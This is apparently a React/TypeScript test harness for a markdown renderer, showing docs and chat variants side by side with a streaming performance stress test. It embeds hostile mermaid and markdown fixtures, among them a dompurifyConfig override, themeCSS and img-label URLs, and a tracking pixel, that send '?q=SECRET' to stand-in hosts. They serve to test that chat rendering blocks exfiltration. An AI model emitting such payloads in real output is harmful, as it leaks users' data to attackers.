/**
 * Markdown harness (WP1): the docs and chat variants of the one renderer,
 * side by side, through the same lazy entry app code uses. Playwright drives
 * it in light, dark and at 390px.
 *
 *   npx vite  →  http://localhost:5173/dev/md-dev.html[?dark=1][&stream=0]
 */
import { StrictMode, useEffect, useState } from 'react'
import { createRoot } from 'react-dom/client'
import './md-dev.css'
import { Markdown, preloadMarkdown, preloadMarkdownPlugins } from '../src/markdown/LazyMarkdown'
import { preprocessMkdocsMarkdown } from '../src/markdown/mkdocsPreprocess'

interface StreamStats {
    updates: number
    chars: number
    ms: number
    longTasks: number
    longTaskMs: number
    maxLongTaskMs: number
    frames: number
    p95FrameMs: number
    maxFrameMs: number
}

declare global {
    interface Window {
        __mdDev: { docsReady: boolean; done: boolean; toggleDark(): void; stats?: StreamStats }
    }
}

const DOCS = `# Markdown harness

Intro with \`inline code\`, a [relative link](./getting-started.md), an
[external link](https://example.com/docs) and a [fragment](#diagram).

## Install \`aiui\` now

\`\`\`python
from praisonaiui import serve

def main() -> None:
    serve(port=8000)  # comment
\`\`\`

\`\`\`ts
export const add = (a: number, b: number): number => a + b
\`\`\`

\`\`\`cobol
MOVE A TO B.
\`\`\`

!!! warning "Blocked types"
    Admonition body with **bold** text and code that keeps its blank line:

    \`\`\`python
    a = 1

    b = 2
    \`\`\`

??? tip "Collapsible"
    Hidden until opened.

=== "Python"

    \`\`\`python
    print("tab one")
    \`\`\`

=== "Shell"

    \`\`\`bash
    aiui serve --port 8000
    \`\`\`

## Diagram

\`\`\`mermaid
graph LR
  A[YAML config] --> B(Compiler) --> C{React SPA}
  C --> D[Docs]
  C --> E[Chat]
\`\`\`

## Math

$$
E = mc^2 \\qquad \\int_0^1 x^2\\,dx = \\tfrac13
$$

## Wide table

| Option | Type | Default | Scope | Since | Description of what this option does in practice |
|---|---|---|---|---|---|
| \`site.title\` | string | "Docs" | global | 0.1 | The title rendered in the header and the document title of every page |
| \`theme.preset\` | enum | zinc | global | 0.2 | Selects one of the bundled colour presets, light and dark |
| \`chat.streaming\` | boolean | true | chat | 0.3 | Streams tokens into the thread as they arrive from the provider |

A very long unbroken token: \`aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\`
`

const HOSTILE = (host: string) => `\`\`\`mermaid
%%{init: {"dompurifyConfig": {"ADD_TAGS": ["img"]}, "themeCSS": ".label{background-image:url(https://${host}/themecss.png)}"}}%%
graph LR
  P@{ img: "https://${host}/shape.png?q=SECRET", label: "Shape", pos: "t", w: 60, h: 60, constraint: "on" }
  P --> Q["<span style='background-image:url(https://${host}/style.png)'>Styled</span>"]
  Q --> R["<img src='https://${host}/label.png?q=SECRET'>"]
\`\`\``

const CHAT = `Sure, here is a **streamed** answer with a list:

1. First item with \`code\`
1. Second item

\`\`\`ts
export function add(a: number, b: number): number {
  return a + b // typed
}
\`\`\`

| col | value |
|-----|-------|
| a   | 1     |

\`\`\`mermaid
graph TD
  Q[Question] --> A[Answer]
  A --> X["<img src='https://exfil.invalid/mermaid.png?q=SECRET'>"]
\`\`\`

${HOSTILE('exfil.invalid')}

Inline math: $$a^2 + b^2 = c^2$$.

An injected image: ![tracking pixel](https://exfil.invalid/pixel.png?q=SECRET)

A same-origin image: ![logo](/icon.svg)

And a [link](https://example.com). Done.`

const QUERY = new URLSearchParams(location.search)
const STREAM = QUERY.get('stream') !== '0'
/** ?long=2000: stream a fence of that many lines through the chat variant and record frame stats. */
const LONG = Number(QUERY.get('long') ?? 0)
/** ?control=1: the hostile diagram through the trusted docs variant (positive control: it does fetch). */
const CONTROL = QUERY.get('control') === '1'

window.__mdDev = {
    docsReady: LONG > 0,
    done: !STREAM && LONG === 0,
    toggleDark: () => document.documentElement.classList.toggle('dark'),
}

function Docs() {
    const [md, setMd] = useState<string | null>(null)
    useEffect(() => {
        // Same order as Content.tsx: preprocess, then preload renderer + plugins, then render.
        const content = preprocessMkdocsMarkdown(CONTROL ? `# Control\n\n${HOSTILE('control.invalid')}\n` : DOCS)
        let live = true
        Promise.all([preloadMarkdown(), preloadMarkdownPlugins(content)]).then(() => {
            if (!live) return
            setMd(content)
            window.__mdDev.docsReady = true
        })
        return () => {
            live = false
        }
    }, [])
    if (md === null) return <p className="text-sm text-muted-foreground">Preparing</p>
    return (
        <article className="aiui-doc max-w-none min-w-0">
            <Markdown variant="docs">{md}</Markdown>
        </article>
    )
}

function Chat() {
    const [n, setN] = useState(STREAM ? 0 : CHAT.length)
    useEffect(() => {
        if (n >= CHAT.length) {
            window.__mdDev.done = true
            return
        }
        const t = setTimeout(() => setN((x) => Math.min(CHAT.length, x + 9)), 16)
        return () => clearTimeout(t)
    }, [n])
    return (
        <Markdown variant="chat" streaming={n < CHAT.length}>
            {CHAT.slice(0, n)}
        </Markdown>
    )
}

const PY_LINES = [
    'def handler_N(event, context):',
    '    """Process event N.',
    '    The docstring spans lines, so grammar state must carry over.',
    '    """',
    '    total = sum(x * N for x in range(10))  # comment N',
    '    return {"id": N, "ok": True, "msg": f"done {total}"}',
    '',
]

/**
 * Stress: a long fence streamed like an LLM would (a few characters per
 * token, one token per frame). Long tasks and frame gaps are recorded.
 */
function LongStream({ lines }: { lines: number }) {
    const text = useState(() => 'Here is the file:\n\n```python\n' + Array.from({ length: lines }, (_, i) => PY_LINES[i % PY_LINES.length].replaceAll('N', String(i))).join('\n') + '\n```\n\nDone.')[0]
    const [n, setN] = useState(0)
    useEffect(() => {
        const longTasks: number[] = []
        const frames: number[] = []
        let obs: PerformanceObserver | null = null
        try {
            obs = new PerformanceObserver((list) => { for (const e of list.getEntries()) longTasks.push(e.duration) })
            obs.observe({ type: 'longtask', buffered: false })
        } catch { /* longtask unsupported */ }
        const t0 = performance.now()
        let last = t0
        let pos = 0
        let updates = 0
        let raf = 0
        const tick = (now: number) => {
            frames.push(now - last)
            last = now
            pos = Math.min(text.length, pos + 4 + (updates % 8))
            updates++
            setN(pos)
            if (pos < text.length) {
                raf = requestAnimationFrame(tick)
                return
            }
            setTimeout(() => {
                obs?.disconnect()
                const sorted = frames.slice(1).sort((a, b) => a - b)
                window.__mdDev.stats = {
                    updates,
                    chars: text.length,
                    ms: performance.now() - t0,
                    longTasks: longTasks.length,
                    longTaskMs: longTasks.reduce((a, b) => a + b, 0),
                    maxLongTaskMs: longTasks.length ? Math.max(...longTasks) : 0,
                    frames: sorted.length,
                    p95FrameMs: sorted[Math.floor(sorted.length * 0.95)] ?? 0,
                    maxFrameMs: sorted.at(-1) ?? 0,
                }
                window.__mdDev.done = true
            }, 500)
        }
        raf = requestAnimationFrame(tick)
        return () => cancelAnimationFrame(raf)
    }, [text])
    return (
        <Markdown variant="chat" streaming={n < text.length}>
            {text.slice(0, n)}
        </Markdown>
    )
}

function App() {
    if (LONG > 0) {
        return (
            <main className="min-h-screen bg-background p-4 text-foreground">
                <section id="chat" className="mx-auto min-w-0 max-w-[760px]">
                    <LongStream lines={LONG} />
                </section>
            </main>
        )
    }
    return (
        <div className="min-h-screen bg-background text-foreground">
            <header className="flex h-12 items-center justify-between border-b border-border px-4">
                <span className="text-sm font-medium">Markdown harness</span>
                <button
                    type="button"
                    id="toggle-dark"
                    className="rounded-md border border-border px-2 py-1 text-xs hover:bg-muted"
                    onClick={() => window.__mdDev.toggleDark()}
                >
                    Toggle dark
                </button>
            </header>
            <main className="grid gap-10 p-4 lg:grid-cols-2 lg:p-8">
                <section id="docs" className="min-w-0">
                    <Docs />
                </section>
                <section id="chat" className="min-w-0">
                    <div className="flex gap-3">
                        <div className="min-w-0 flex-1">
                            <Chat />
                        </div>
                    </div>
                </section>
            </main>
        </div>
    )
}

createRoot(document.getElementById('root')!).render(
    <StrictMode>
        <App />
    </StrictMode>,
)
